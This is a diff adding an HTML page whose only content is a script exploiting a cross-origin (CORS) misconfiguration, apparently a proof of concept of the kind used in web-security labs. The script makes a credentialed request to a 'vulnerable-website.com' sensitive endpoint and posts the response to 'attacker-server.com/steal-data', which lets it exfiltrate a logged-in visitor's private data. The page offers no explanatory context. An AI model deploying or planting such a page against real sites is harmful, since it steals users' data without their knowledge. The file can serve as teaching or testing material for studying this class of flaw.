@@ -1,0 +1,19 @@
+<html>
+<body>
+   <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://vulnerable-website.com/sensitive-endpoint', true);
+      xhr.withCredentials = true;
+      xhr.onreadystatechange = function() {
+         if (xhr.readyState == 4 && xhr.status == 200) {
+            // Send the data back to the attacker's server
+            fetch('http://attacker-server.com/steal-data', {
+               method: 'POST',
+               body: xhr.responseText
+            });
+         }
+      };
+      xhr.send();
+   </script>
+</body>
+</html>
